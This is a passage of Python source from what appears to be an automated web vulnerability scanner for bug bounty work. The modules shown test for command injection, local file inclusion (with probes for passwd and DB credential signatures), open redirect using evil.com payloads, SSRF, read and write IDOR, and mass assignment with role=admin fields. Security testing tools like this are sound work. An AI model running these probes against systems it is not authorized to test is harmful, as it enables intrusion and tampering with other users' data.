        ps = parse_qs(p.query)
        base_params = {k: v[0] for k, v in ps.items()}
        base_url    = urlunparse(p._replace(query=urlencode(base_params)))

        # ── STEP 1: 3× baseline timing ────────────────────────────
        try:
            base_times = []
            for _ in range(3):
                t0 = time.time()
                safe_get(base_url, headers=headers, timeout=8, verify=False)
                base_times.append(time.time() - t0)
            baseline_avg = sum(base_times) / len(base_times)
            # If server already slow (>2s avg), time-based is unreliable — skip
            if baseline_avg > 2.0:
                return None
        except Exception:
            return None

        for payload, delay, os_type in CMDI_TIME_PAYLOADS:
            if url in found:
                return None
            tp = base_params.copy()
            tp[param] = tp.get(param, "test") + payload
            test_url = urlunparse(p._replace(query=urlencode(tp)))

            # ── STEP 2: 1st payload probe ─────────────────────────
            try:
                t1 = time.time()
                safe_get(test_url, headers=headers, timeout=delay + 6, verify=False)
                elapsed1 = time.time() - t1
                required = baseline_avg + (delay * 0.8)
                if elapsed1 < required:
                    continue  # delay too small — try next payload
            except Exception:
                continue

            # ── STEP 3: 2nd payload probe (must reproduce) ────────
            # Network jitter or ORM cold-start can cause one slow response.
            # A real CmdI delay must be consistently reproducible.
            try:
                t2 = time.time()
                safe_get(test_url, headers=headers, timeout=delay + 6, verify=False)
                elapsed2 = time.time() - t2
                required2 = baseline_avg + (delay * 0.7)
                if elapsed2 < required2:
                    continue  # Not reproducible — was ORM jitter, skip
            except Exception:
                continue

            avg_delay = (elapsed1 + elapsed2) / 2
            return (url, param, payload,
                    f"{avg_delay:.1f}s (baseline {baseline_avg:.1f}s)",
                    p.path, os_type, "time")

        return None

    # Phase 1: Output-based — shell-suggestive params only
    # CmdI requires the app to pass user input to a shell command.
    # Params like "cmd", "exec", "ping", "ip" are real targets.
    # Generic params like "redirect", "locale", "page" are not.
    # This cuts 95% of false combinations from SMART INJECT.
    CMDI_TARGET_PARAMS = {
        "cmd", "exec", "command", "run", "execute", "ping", "ip",
        "host", "hostname", "addr", "address", "target", "server",
        "shell", "query", "q", "search", "name", "input", "data",
        "test", "value", "code", "action", "op", "operation",
        "process", "task", "job", "tool", "util", "check", "scan",
        "lookup", "resolve", "nslookup", "trace", "traceroute",
        "url", "uri", "path", "file", "filename"
    }

    tasks = [(url, param, payload, sigs, os_type)
             for url, pnames in params_map.items()
             for param in pnames
             if param in CMDI_TARGET_PARAMS  # only shell-suggestive params
             for payload, sigs, os_type in CMDI_OUTPUT_PAYLOADS]

    log(f"CmdI Phase 1 (output-based): {len(tasks)} combinations (shell-likely params only)...")
    with concurrent.futures.ThreadPoolExecutor(max_workers=THREADS) as ex:
        futures = {ex.submit(_test_cmdi_output, t): t for t in tasks}
        for fut in concurrent.futures.as_completed(futures):
            r = fut.result()
            if r:
                url, param, payload, sig, path, os_type, method = r
                if url not in found:
                    found.add(url)
                    add_finding("Command Injection", "critical", f"{path}?{param}=",
                        f"Command injection in '{param}' ({os_type}). OS command output in response — full server compromise possible.",
                        f"GET {path}?{param}=<value>{payload} -> '{sig}' in response",
                        "Never pass user input to shell commands. Use subprocess with shell=False. Whitelist input.")

    # Phase 2: Time-based — ONLY shell-likely params not yet confirmed
    shell_params = [
        (url, param)
        for url, pnames in params_map.items()
        if url not in found
        for param in pnames
        if param.lower() in CMDI_SHELL_PARAMS
        and param.lower() not in CMDI_SAFE_PARAMS
    ]

    if shell_params:
        log(f"CmdI Phase 2 (time-based blind): {len(shell_params)} shell-likely params...")
        with concurrent.futures.ThreadPoolExecutor(max_workers=min(THREADS, 4)) as ex:
            futures = {ex.submit(_test_cmdi_time, url, param, headers): (url, param)
                       for url, param in shell_params}
            for fut in concurrent.futures.as_completed(futures):
                r = fut.result()
                if r:
                    url, param, payload, timing, path, os_type, method = r
                    if url not in found:
                        found.add(url)
                        add_finding("Command Injection (Time-Based Blind)", "critical",
                            f"{path}?{param}=",
                            f"Time-based blind CmdI in '{param}' ({os_type}). Response delayed {timing} — confirms OS command execution with no output visible.",
                            f"GET {path}?{param}=<value>{payload} -> {timing}",
                            "Never pass user input to shell commands. Time-delay confirms execution even without output.")
    else:
        log("CmdI Phase 2: no shell-likely params found — skipping time-based", "info")

    # Test forms — output-based only
    for form in forms:
        if form["action"] in found:
            continue
        for payload, sigs, os_type in CMDI_OUTPUT_PAYLOADS[:8]:
            data = {}
            for i in form["inputs"]:
                if not i["name"]:
                    continue
                if i["type"] not in ["submit", "hidden", "button"]:
                    data[i["name"]] = i.get("value", "test") + payload
                else:
                    data[i["name"]] = i["value"]
            if not data:
                continue
            try:
                resp = safe_post(form["action"], data=data, headers=headers, timeout=10, verify=False) \
                    if form["method"] == "post" \
                    else safe_get(form["action"], params=data, headers=headers, timeout=10, verify=False)
                body = resp.text.lower()
                for sig in sigs:
                    if sig.lower() in body and form["action"] not in found:
                        found.add(form["action"])
                        add_finding("Command Injection in Form", "critical", form["action"],
                            f"OS command injection via form ({os_type}).",
                            f"POST {form['action']} -> '{sig}' in response",
                            "Avoid shell commands. Use language-native alternatives.")
                        break
            except Exception:
                pass


# ═══════════════════════════════════════════════════════════════
# MODULE 8: LFI — threaded, smart targeting
# ═══════════════════════════════════════════════════════════════
LFI_SIGNATURES = [
    "root:x:0:0", "root:!:0:0",
    "[boot loader]", "[operating systems]", "for 16-bit app support",
    "DB_PASSWORD", "DB_HOST", "define('DB_",
    "[fonts]", "[extensions]", "MSDOS",
    "C:\\", "C:/Windows",
]

def test_lfi(target, urls, params_map, headers):
    found = set()
    lfi_params = ["file", "page", "include", "path", "dir", "document",
                  "root", "pg", "style", "pdf", "template", "doc",
                  "folder", "inc", "show", "type", "view", "load", "read", "item"]

    def _test_lfi(args):
        url, param, payload = args
        p = urlparse(url)
        ps = parse_qs(p.query)
        tp = {k: v[0] for k, v in ps.items()}

        tp[param] = payload
        test_url = urlunparse(p._replace(query=urlencode(tp)))
        try:
            resp = safe_get(test_url, headers=headers, timeout=8, verify=False)
            # Quick check first
            hit_sig = None
            for sig in LFI_SIGNATURES:
                if sig in resp.text:
                    hit_sig = sig
                    break
            if not hit_sig:
                return None
        except Exception:
            return None

        # ── DIFFERENTIAL BASELINE (lazy — only on hits) ───────────
        # Only fetch baseline when we have a potential LFI hit.
        # If signature pre-exists in clean response, it's app content.
        try:
            base_tp = {k: v[0] for k, v in ps.items()}
            base_tp[param] = "sentrix_lfi_probe_clean"
            base_url = urlunparse(p._replace(query=urlencode(base_tp)))
            baseline_resp = safe_get(base_url, headers=headers, timeout=8, verify=False)
            if hit_sig in baseline_resp.text:
                return None  # Pre-exists — not LFI
        except Exception:
            pass

        return (url, param, payload, hit_sig, p.path)

    # LFI param filter — only test file-related params.
    # With SMART INJECT adding 500+ endpoints, testing all params
    # on all endpoints generates 60k+ combinations and floods scan time.
    # LFI requires the app to actually read files based on user input —
    # params like "file", "path", "include" are the real targets.
    LFI_TARGET_PARAMS = {
        "file", "page", "include", "path", "dir", "document", "root",
        "pg", "style", "pdf", "template", "doc", "folder", "inc",
        "show", "type", "view", "load", "read", "item", "filename",
        "filepath", "f", "img", "image", "download", "module", "conf",
        "config", "src", "source", "lang", "locale", "layout"
    }

    tasks = []
    for url, pnames in params_map.items():
        ppath = urlparse(url).path.lower()
        file_related_path = any(kw in ppath for kw in [
            "file", "show", "image", "img", "view", "load",
            "page", "doc", "read", "inc", "template", "download",
            "item", "lang", "locale", "theme", "skin", "module"
        ])
        # Only test params that are actually file-related
        target_pnames = [p for p in pnames if p in LFI_TARGET_PARAMS]

        # STRICT MODE: Require BOTH a file-related path AND a file-related param.
        # Old behavior (OR logic) was matching SMART INJECT endpoints with generic
        # params like "type", "view", "item" — generating 15k+ combinations on
        # pure API targets. Real LFI needs the app to read files from user input,
        # which only happens when both the endpoint path AND the param suggest it.
        if file_related_path and target_pnames:
            for param in target_pnames:
                for payload in LFI_PAYLOADS:
                    tasks.append((url, param, payload))
        # Exception: if the param name is unambiguously file-related (file, include,
        # path, filepath, document) test it regardless of path — these are almost
        # always file read params no matter what endpoint they're on.
        elif target_pnames:
            UNAMBIGUOUS_FILE_PARAMS = {"file", "include", "path", "filepath", "document", "pdf", "download"}
            unambiguous = [p for p in target_pnames if p in UNAMBIGUOUS_FILE_PARAMS]
            for param in unambiguous:
                for payload in LFI_PAYLOADS:
                    tasks.append((url, param, payload))

    # ── HARD SKIP: API-only targets with no file params ────────────
    # If zero file-related params were found (pure REST/JSON API),
    # LFI is impossible — skip entirely rather than burning 30k requests.
    # This is the most common case on modern bug bounty targets.
    if not tasks:
        log("LFI: no file-related params found — skipping (API-only target)", "info")
        return

    # ── SAFETY CAP: max 5000 combinations ─────────────────────────
    # Even with file params, don't let LFI dominate the scan time.
    # 5000 combinations at 10 req/sec = ~8 minutes max.
    if len(tasks) > 5000:
        log(f"LFI: {len(tasks)} combinations — capping to 5000 for rate safety", "warn")
        tasks = tasks[:5000]

    log(f"LFI: testing {len(tasks)} combinations across {THREADS} threads...")
    with concurrent.futures.ThreadPoolExecutor(max_workers=THREADS) as ex:
        futures = {ex.submit(_test_lfi, t): t for t in tasks}
        for fut in concurrent.futures.as_completed(futures):
            r = fut.result()
            if r:
                url, param, payload, sig, path = r
                if url not in found:
                    found.add(url)
                    add_finding("Local File Inclusion (LFI)", "critical", f"{path}?{param}=",
                        f"LFI in '{param}'. File system access confirmed — can read sensitive files.",
                        f"GET {path}?{param}={payload} -> '{sig}' in response",
                        "Whitelist allowed file paths. Use basename(). Disable PHP wrappers.")


# ═══════════════════════════════════════════════════════════════
# MODULE 9: OPEN REDIRECT — fast threaded
# ═══════════════════════════════════════════════════════════════
def test_open_redirect(target, urls, params_map, headers):
    found  = set()
    parsed = urlparse(target)
    base   = f"{parsed.scheme}://{parsed.netloc}"

    fast_payloads = [
        "https://evil.com", "//evil.com", "//evil.com/%2F..",
        "/\\evil.com", "https:evil.com", "%2F%2Fevil.com",
        "https://evil.com@trusted.com", "///evil.com",
    ]

    def _test_redir(args):
        url, param, payload, p, params = args
        if url in found:
            return None
        tp = {k: v[0] for k, v in params.items()}
        tp[param] = payload
        try:
            resp = safe_get(urlunparse(p._replace(query=urlencode(tp))),
                headers=headers, timeout=6, verify=False, allow_redirects=False)
            loc = resp.headers.get("Location", "")
            if resp.status_code in [301,302,303,307,308] and "evil.com" in loc and url not in found:
                return (url, param, payload, p.path, loc)
        except Exception:
            pass
        return None

    # Open Redirect only applies to params that accept URLs/paths.
    # Testing every smart-injected param (page, limit, lang, etc.) is
    # wasteful — redirect happens in url/next/return/goto/dest params.
    REDIR_PARAMS = {
        "url", "uri", "redirect", "redirect_uri", "redirect_url",
        "next", "return", "return_url", "return_to", "returnto",
        "goto", "dest", "destination", "target", "to", "forward",
        "location", "link", "callback", "continue", "r", "redir",
        "ref", "referer", "referrer", "back", "after", "success",
        "failure", "cancel", "logout_redirect", "login_redirect"
    }

    tasks = [(url, param, payload, urlparse(url), parse_qs(urlparse(url).query))
             for url, pnames in params_map.items()
             for param in pnames
             if param in REDIR_PARAMS  # only redirect-relevant params
             for payload in fast_payloads]

    with concurrent.futures.ThreadPoolExecutor(max_workers=THREADS) as ex:
        for r in ex.map(_test_redir, tasks):
            if r:
                url, param, payload, path, loc = r
                if url not in found:
                    found.add(url)
                    add_finding("Open Redirect", "medium", f"{path}?{param}=",
                        f"Open redirect in '{param}' — attacker redirects victims via trusted domain.",
                        f"GET {path}?{param}={payload} -> Location: {loc}",
                        "Whitelist allowed redirect destinations. Use relative paths only.")

    for param in REDIRECT_PARAMS[:15]:
        if len(found) > 5:
            break
        for payload in ["https://evil.com", "//evil.com"]:
            tu = f"{base}/?{param}={payload}"
            if tu in found:
                continue
            try:
                resp = safe_get(tu, headers=headers, timeout=5, verify=False, allow_redirects=False)
                loc = resp.headers.get("Location", "")
                if resp.status_code in [301,302,303,307,308] and "evil.com" in loc:
                    found.add(tu)
                    add_finding("Open Redirect", "medium", f"/?{param}=",
                        f"Open redirect via '{param}'.",
                        f"GET /?{param}={payload} -> Location: {loc}",
                        "Validate and whitelist all redirect destinations.")
            except Exception:
                pass


# ═══════════════════════════════════════════════════════════════
# MODULE 10: SSRF — strict false positive prevention
#
# False positive sources eliminated:
#   1. Redirect params (RetURL, next, redirect, callback etc.) —
#      these just do Location: <value>, server never fetches them
#   2. Reflected payloads — if our injected URL appears verbatim
#      in response body, it was reflected not fetched
#   3. Signature in baseline — already on page before injection
#
# Only flags if:
#   - Param is NOT a known redirect param
#   - SSRF signature appears in response
#   - Signature was NOT in baseline
#   - Injected payload URL itself is NOT just reflected back
# ═══════════════════════════════════════════════════════════════

# Params that do redirects — NEVER flag these for SSRF
REDIRECT_ONLY_PARAMS = {
    'returl', 'returnurl', 'return_url', 'next', 'redirect',
    'redirect_uri', 'redirect_url', 'goto', 'return', 'returnto',
    'callback', 'continue', 'destination', 'dest', 'forward',
    'location', 'redir', 'ref', 'target', 'jump', 'successurl',
    'failurl', 'cancelurl', 'backurl', 'referer', 'referrer',
}

def test_ssrf(target, urls, forms, params_map, headers):
    found = set()

    for url, pnames in params_map.items():
        p      = urlparse(url)
        params = parse_qs(p.query)

        # Filter: only test params that look like they fetch URLs server-side
        ssrf_candidates = []
        for pm in pnames:
            pm_lower = pm.lower()
            # Skip known redirect-only params — they never fetch
            if pm_lower in REDIRECT_ONLY_PARAMS:
                continue
            if any(s in pm_lower for s in SSRF_PARAMS):
                ssrf_candidates.append(pm)

        # Also check path keywords — these strongly suggest server-side fetch
        # NOTE: "/api/" removed intentionally — it matches every REST endpoint
        # on modern apps and generates thousands of useless SSRF tests.
        # Only specific path segments that imply fetching external resources.
        path_is_ssrf = any(kw in p.path.lower() for kw in [
            "fetch", "proxy", "load", "request",
            "webhook", "remote", "import", "download", "curl",
        ])

        if not ssrf_candidates and not path_is_ssrf:
            continue

        params_to_test = ssrf_candidates if ssrf_candidates else [
            pm for pm in pnames if pm.lower() not in REDIRECT_ONLY_PARAMS
        ]

        for param in params_to_test:
            if url in found:
                break

            # Get baseline FIRST
            try:
                bd = {k: v[0] for k, v in params.items()}
                baseline_resp = safe_get(
                    urlunparse(p._replace(query=urlencode(bd))),
                    headers=headers, timeout=8, verify=False)
                baseline_text = baseline_resp.text
            except Exception:
                baseline_text = ""

            for payload in SSRF_PAYLOADS[:15]:
                if url in found:
                    break
                inject = {k: v[0] for k, v in params.items()}
                inject[param] = payload
                try:
                    resp = safe_get(
                        urlunparse(p._replace(query=urlencode(inject))),
                        headers=headers, timeout=8, verify=False)

                    for sig in SSRF_SIGNATURES:
                        if sig not in resp.text:
                            continue
                        if sig in baseline_text:
                            continue  # Was already there before injection

                        # Critical check: is this just the payload being reflected?
                        # If payload URL itself is in response verbatim — it's a redirect, not SSRF
                        if payload in resp.text and resp.text.count(payload) >= 1:
                            # Check if it's just reflected (short response = likely just reflection)
                            if len(resp.text) < 2000:
                                continue  # Likely just reflection

                        if url not in found:
                            found.add(url)
                            add_finding(
                                "Server-Side Request Forgery (SSRF)", "critical",
                                f"{p.path}?{param}=",
                                f"SSRF in '{param}' — server fetched internal resource. Signature '{sig}' confirmed in response (not in baseline, not reflected).",
                                f"GET {p.path}?{param}={payload} -> '{sig}' found (baseline clean)",
                                "Whitelist allowed URLs. Block RFC1918 + cloud metadata IPs server-side. Use DNS resolution checks.")
                            break
                except Exception:
                    pass


# ═══════════════════════════════════════════════════════════════
# MODULE 11: IDOR — deduped by path:param, expanded patterns
# ═══════════════════════════════════════════════════════════════
def test_idor(target, urls, headers):
    parsed_target = urlparse(target)
    base = f"{parsed_target.scheme}://{parsed_target.netloc}"
    found_idor = set()

    # ── Path-based IDOR: /api/Users/1 → try /api/Users/2, 3, 4 ──
    id_in_path_re = re.compile(r'^(.*?/)(\d+)(/.*)?$')

    # Collect path-based candidates from discovered URLs
    path_idor_targets = []
    for url in urls:
        p = urlparse(url)
        if id_in_path_re.match(p.path):
            path_idor_targets.append(url)

    # Add common REST API ID patterns directly (Juice Shop + standard REST)
    common_id_paths = [
        # /api/ endpoints
        "/api/Users/1", "/api/Users/2", "/api/Users/3",
        "/api/BasketItems/1", "/api/BasketItems/2",
        "/api/Orders/1", "/api/Orders/2",
        "/api/Addresss/1", "/api/Addresss/2",
        "/api/Cards/1", "/api/Cards/2",
        "/api/Feedbacks/1", "/api/Feedbacks/2",
        "/api/Recycles/1", "/api/Recycles/2",
        "/api/Complaints/1", "/api/Complaints/2",
        "/api/SecurityAnswers/1", "/api/SecurityAnswers/2",
        "/api/Quantitys/1", "/api/Quantitys/2",
        # /rest/ endpoints with IDs
        "/rest/basket/1", "/rest/basket/2", "/rest/basket/3",
        "/rest/order-history/1", "/rest/order-history/2",
        "/rest/user/1", "/rest/user/2", "/rest/user/3",
        "/rest/memories/1", "/rest/memories/2",
        # /rest/products is public catalog — not IDOR
        # "/rest/products/1", "/rest/products/2", "/rest/products/3",
        "/rest/wallet/balance/1", "/rest/wallet/balance/2",
        "/rest/deluxe-membership/1",
    ]
    for cp in common_id_paths:
        full = base + cp
        if full not in path_idor_targets:
            path_idor_targets.append(full)

    # Resources that are inherently public/catalog — not user-owned.
    # IDOR on these is not a valid finding (Products are public, Challenges are CTF tasks, etc.)
    IDOR_EXCLUDE_RESOURCES = {
        'products', 'challenges', 'hints', 'securityquestions',
        'quantitys', 'quantities', 'categories', 'tags', 'news',
        'announcements', 'config', 'settings', 'deliverymethods',
    }

    def _is_excluded_resource(path):
        """Return True if path points to a public/catalog resource."""
        name = path.rstrip('/').split('/')[-1].lower()
        # Strip trailing digits to get resource name
        name_no_id = name.rstrip('0123456789')
        resource = name_no_id.rstrip('/')
        # Also check parent segment (e.g. /api/Products/1 -> 'products')
        parts = [p.lower().rstrip('0123456789').rstrip('/') for p in path.split('/') if p]
        return any(p in IDOR_EXCLUDE_RESOURCES for p in parts)

    # Dynamically append /1 /2 /3 to ALL discovered /rest/ and /api/ base endpoints
    # Catches any endpoint the crawler found that doesn't already have an ID in path
    for url in urls:
        p = urlparse(url)
        path = p.path.rstrip("/")
        if _is_excluded_resource(path):
            continue  # Skip catalog/public resources
        if not id_in_path_re.match(path):
            if "/rest/" in path or "/api/" in path:
                for test_id in [1, 2, 3]:
                    candidate = base + path + "/" + str(test_id)
                    if candidate not in path_idor_targets:
                        path_idor_targets.append(candidate)

    def _test_path_idor(url):
        p = urlparse(url)
        m = id_in_path_re.match(p.path)
        if not m:
            return
        if _is_excluded_resource(p.path):
            return  # Skip public/catalog resources
        prefix     = m.group(1)
        current_id = int(m.group(2))
        suffix     = m.group(3) or ""

        try:
            resp_own = safe_get(url, headers=headers, timeout=8, verify=False)
            if resp_own.status_code not in (200, 201):
                return
            own_body = resp_own.text
            if len(own_body) < 20:
                return

            # Try IDs 1-5 plus current±1
            test_ids = list({i for i in range(1, 6)} | {current_id+1, current_id+2})
            test_ids = [i for i in test_ids if i != current_id and i > 0]

            for test_id in test_ids:
                test_path = f"{prefix}{test_id}{suffix}"
                test_url  = f"{parsed_target.scheme}://{parsed_target.netloc}{test_path}"
                key = test_path
                if key in found_idor:
                    continue
                try:
                    resp_other = safe_get(test_url, headers=headers, timeout=8, verify=False)
                    if resp_other.status_code in (200, 201):
                        other_body = resp_other.text
                        if (len(other_body) > 20
                                and other_body != own_body
                                and other_body.strip() not in ('{}', '[]', 'null', '')):
                            data_indicators = ['"id"', '"email"', '"username"',
                                               '"name"', '"role"', '"token"',
                                               '"address"', '"card"', '"order"',
                                               '"password"', '"price"', '"quantity"']
                            if any(ind in other_body for ind in data_indicators):
                                found_idor.add(key)
                                _auth_h = headers.get("Authorization","")
                                _curl_auth = f' -H "Authorization: {_auth_h}"' if _auth_h else ""
                                add_finding(
                                    "IDOR — Unauthorized Object Access", "high",
                                    test_path,
                                    f"Authenticated request to {test_path} returns another user's "
                                    f"data. No ownership check enforced on object ID.",
                                    f"GET {test_path} → HTTP {resp_other.status_code}, "
                                    f"{len(other_body)} bytes of object data returned. "
                                    f"Different from own resource ({len(own_body)} bytes).",
                                    "Enforce object-level authorization on every request. "
                                    "Verify the requesting user owns the resource. "
                                    "Use UUIDs instead of sequential IDs.",
                                    curl=f'curl -s{_curl_auth} "{base}{test_path}"'
                                )
                                return
                except Exception:
                    continue
        except Exception:
            pass

    # ── Param-based IDOR: ?id=1 → try ?id=2 ──
    id_param_re = re.compile(
        r'[?&](id|user_id|uid|account|profile|order|item|doc|record|'
        r'pid|userid|objectid|resource_id|product|post|msg|invoice|'
        r'ticket|task|customer|client)=(\d+)',
        re.IGNORECASE
    )

    def _test_param_idor(url):
        match = id_param_re.search(url)
        if not match:
            return
        param      = match.group(1)
        value      = int(match.group(2))
        p          = urlparse(url)
        qs         = parse_qs(p.query)
        endpoint_key = f"{p.path}:{param.lower()}"
        if endpoint_key in found_idor:
            return
        try:
            base_resp = safe_get(url, headers=headers, timeout=8, verify=False)
            if base_resp.status_code != 200:
                return
            base_body = base_resp.text
            for test_val in [value+1, value-1, 1, 2, 3]:
                if test_val <= 0 or test_val == value:
                    continue
                tp = {k: v[0] for k, v in qs.items()}
                tp[param] = str(test_val)
                test_url = urlunparse(p._replace(query=urlencode(tp)))
                resp = safe_get(test_url, headers=headers, timeout=8, verify=False)
                if (resp.status_code == 200
                        and len(resp.text) > 20
                        and resp.text != base_body
                        and "login" not in resp.url.lower()):
                    found_idor.add(endpoint_key)
                    add_finding(
                        "IDOR — Parameter Manipulation", "high",
                        f"{p.path}?{param}={test_val}",
                        f"Changing '{param}' from {value} to {test_val} returns different data. "
                        f"No ownership check on this parameter.",
                        f"GET {p.path}?{param}={test_val} → HTTP {resp.status_code}, "
                        f"{abs(len(resp.text)-len(base_body))} bytes diff",
                        "Validate authenticated user owns requested resource. "
                        "Never rely on client-supplied IDs without server-side check."
                    )
                    break
        except Exception:
            pass

    log(f"IDOR: testing {len(path_idor_targets)} path-based endpoints + param-based on {len(urls)} URLs...")

    with concurrent.futures.ThreadPoolExecutor(max_workers=THREADS) as ex:
        list(ex.map(_test_path_idor, path_idor_targets))

    with concurrent.futures.ThreadPoolExecutor(max_workers=THREADS) as ex:
        list(ex.map(_test_param_idor, urls))


# ═══════════════════════════════════════════════════════════════
# MODULE 11b: WRITE IDOR — PUT/PATCH/DELETE on other users' objects
#
# Read IDOR (GET another user's data) is valuable but Write IDOR
# is more critical — it means you can MODIFY or DELETE another
# user's data. Programs pay P1 for this.
#
# Strategy:
#   1. Find endpoints that accept PUT/PATCH/DELETE (from crawl)
#   2. Confirm authenticated user owns ID=N
#   3. Try same verb with ID=N±1 (other user's resource)
#   4. If response is 200/204, it's a write IDOR
#   5. SAFE: we only attempt, never actually commit destructive changes
#      by using a read-only "dry run" pattern where possible
# ═══════════════════════════════════════════════════════════════
def test_write_idor(target, urls, headers):
    """
    Tests for write IDOR on PUT/PATCH/DELETE endpoints.
    Safe: sends minimal payloads, detects 200/204 responses that
    indicate the operation was accepted without ownership check.
    """
    found = set()
    parsed_target = urlparse(target)
    base = f"{parsed_target.scheme}://{parsed_target.netloc}"

    # Pattern: /api/Resource/N or /api/v1/Resource/N
    id_path_re = re.compile(
        r'^(/(?:[a-z0-9_-]+/)*[a-zA-Z][a-zA-Z0-9_-]*)(/)(\d+)(/.*)?$'
    )

    # Resource types that are inherently shared/public — not user-owned objects.
    # Writing to these is either expected (admin) or not a real IDOR.
    WRITE_IDOR_EXCLUDE_RESOURCES = {
        'products', 'challenges', 'hints', 'securityquestions',
        'quantitys', 'quantities', 'categories', 'tags', 'news',
        'announcements', 'config', 'settings',
    }

    # Collect candidate endpoints from crawled URLs
    candidates = []
    seen_patterns = set()
    for url in urls:
        p = urlparse(url)
        m = id_path_re.match(p.path)
        if not m:
            continue
        resource_base = m.group(1)   # e.g. /api/Users
        resource_name = resource_base.rstrip('/').split('/')[-1].lower()
        if resource_name in WRITE_IDOR_EXCLUDE_RESOURCES:
            continue  # Skip catalog/public resources
        obj_id = int(m.group(3))     # e.g. 2
        pattern_key = resource_base
        if pattern_key in seen_patterns:
            continue
        seen_patterns.add(pattern_key)
        candidates.append((url, resource_base, obj_id))

    # Also generate candidates from common REST patterns on discovered resources
    api_resources = set()
    for url in urls:
        p = urlparse(url)
        # Match /api/Something (no trailing ID)
        rname = p.path.rstrip('/').split('/')[-1].lower()
        if re.match(r'^/api/[A-Za-z][A-Za-z0-9_-]+$', p.path) and rname not in WRITE_IDOR_EXCLUDE_RESOURCES:
            api_resources.add(p.path)

    for resource_path in api_resources:
        if resource_path not in seen_patterns:
            seen_patterns.add(resource_path)
            for test_id in [1, 2, 3]:
                candidates.append((
                    base + resource_path + f"/{test_id}",
                    resource_path,
                    test_id
                ))

    def _test_write_idor(args):
        url, resource_base, own_id = args
        if resource_base in found:
            return None

        # Step 1: Confirm we can GET our own resource (establishes baseline)
        try:
            own_url = base + resource_base + f"/{own_id}"
            own_resp = safe_get(own_url, headers=headers, timeout=8, verify=False)
            if own_resp.status_code != 200:
                return None
            own_body = own_resp.text
        except Exception:
            return None

        # Step 2: Try other IDs
        for other_id in [1, 2, 3, 4, 5]:
            if other_id == own_id or resource_base in found:
                continue

            other_url = base + resource_base + f"/{other_id}"

            # Step 3: Test PUT — minimal body based on GET response structure
            # Build a safe minimal payload — just echo back what we got
            try:
                # First GET the other resource to understand its structure
                other_get = safe_get(other_url, headers=headers, timeout=8, verify=False)
                if other_get.status_code != 200:
                    continue
                other_data = other_get.text

                # Parse existing fields so we send valid structure
                try:
                    existing = json.loads(other_data)
                    if isinstance(existing, dict) and "data" in existing:
                        existing = existing["data"]
                    # Build minimal update: just resend what's there (no-op change)
                    if isinstance(existing, dict):
                        # Pick a safe non-destructive field to "update"
                        safe_update = {}
                        for k, v in existing.items():
                            if k.lower() in ["username", "name", "bio", "description",
                                             "title", "comment", "address", "phone"]:
                                safe_update[k] = v  # Same value — no actual change
                                break
                        if not safe_update:
                            # Use a generic safe field
                            safe_update = {list(existing.keys())[0]: existing[list(existing.keys())[0]]} if existing else {}
                    else:
                        safe_update = {}
                except (json.JSONDecodeError, IndexError):
                    safe_update = {}

                put_headers = headers.copy()
                put_headers["Content-Type"] = "application/json"

                # Try PUT
                try:
                    put_resp = safe_request("PUT", other_url,
                        json=safe_update, headers=put_headers, timeout=8, verify=False)
                    if put_resp.status_code in [200, 201, 204]:
                        if resource_base not in found:
                            found.add(resource_base)
                            return ("PUT", other_url, resource_base, other_id,
                                    put_resp.status_code, own_id)
                except Exception:
                    pass

                # Try PATCH if PUT failed
                try:
                    patch_resp = safe_request("PATCH", other_url,
                        json=safe_update, headers=put_headers, timeout=8, verify=False)
                    if patch_resp.status_code in [200, 201, 204]:
                        if resource_base not in found:
                            found.add(resource_base)
                            return ("PATCH", other_url, resource_base, other_id,
                                    patch_resp.status_code, own_id)
                except Exception:
                    pass

            except Exception:
                continue

        return None

    log(f"Write IDOR: testing PUT/PATCH on {len(candidates)} resource endpoints...")
    with concurrent.futures.ThreadPoolExecutor(max_workers=min(THREADS, 5)) as ex:
        futures = {ex.submit(_test_write_idor, t): t for t in candidates}
        for fut in concurrent.futures.as_completed(futures):
            r = fut.result()
            if r:
                method, url, resource, other_id, status, own_id = r
                p = urlparse(url)
                add_finding(
                    "Write IDOR — Unauthorized Modification", "critical",
                    p.path,
                    f"{method} {p.path} (ID={other_id}) accepted without ownership check. "
                    f"Attacker can modify another user's resource. "
                    f"Authenticated as user owning ID={own_id}.",
                    f"{method} {p.path} → HTTP {status} (expected 403/404 for other user's resource)",
                    "Verify authenticated user owns the resource before allowing write operations. "
                    "Never trust client-supplied resource IDs — look up ownership server-side."
                )


# ═══════════════════════════════════════════════════════════════
# MODULE 11c: MASS ASSIGNMENT — extra JSON fields accepted
#
# Modern APIs built with ORMs often auto-map JSON body fields to
# model attributes. If you send {"role":"admin"} and the server
# doesn't whitelist fields, you just escalated yourself.
#
# High-paying finding — often P1 (privilege escalation) or P2.
# ═══════════════════════════════════════════════════════════════
def test_mass_assignment(target, urls, headers):
    """
    Tests for mass assignment on POST/PUT/PATCH endpoints.
    Sends extra privileged fields alongside normal data and checks
    if the server accepts them (200/201 with changed values).
    """
    found = set()
    parsed_target = urlparse(target)
    base = f"{parsed_target.scheme}://{parsed_target.netloc}"

    # Fields that should NEVER be settable by users
    PRIVILEGED_FIELDS = [
        ("role",        ["admin", "administrator", "superuser", "moderator", "staff"]),
        ("is_admin",    [True, 1, "true"]),
        ("is_staff",    [True, 1, "true"]),
        ("admin",       [True, 1, "true"]),
        ("verified",    [True, 1, "true"]),
        ("balance",     [99999, 1000000]),
        ("credits",     [99999]),
        ("discount",    [100, 99]),
        ("price",       [0, 0.01]),
        ("status",      ["active", "verified", "approved", "admin"]),
        ("permissions", ["*", "admin", ["read","write","delete","admin"]]),
        ("group",       ["admin", "administrators"]),
        ("plan",        ["enterprise", "premium", "unlimited"]),
        ("subscription",["enterprise", "premium"]),
    ]

    # Find endpoints that accept POST/PUT (registration, profile update, etc.)
    update_endpoints = []
    api_paths_seen = set()

    for url in urls:
        p = urlparse(url)
        path_lower = p.path.lower()
        # Prioritize: registration, profile, account, user update endpoints
        if any(kw in path_lower for kw in [
            "register", "signup", "sign_up", "create", "profile", "account",
            "user", "update", "settings", "preferences", "/api/"
        ]):
            if p.path not in api_paths_seen:
                api_paths_seen.add(p.path)
                update_endpoints.append(base + p.path)

    def _test_mass_assign(endpoint):
        if endpoint in found:
            return None

        put_headers = headers.copy()
        put_headers["Content-Type"] = "application/json"

        # First GET the endpoint to understand its structure
        try:
            get_resp = safe_get(endpoint, headers=headers, timeout=8, verify=False)
            if get_resp.status_code not in [200, 201]:
                return None
            try:
                existing = json.loads(get_resp.text)
                if isinstance(existing, dict) and "data" in existing:
                    existing = existing["data"]
            except json.JSONDecodeError:
                existing = {}
        except Exception:
            return None

        if not isinstance(existing, dict):
            return None

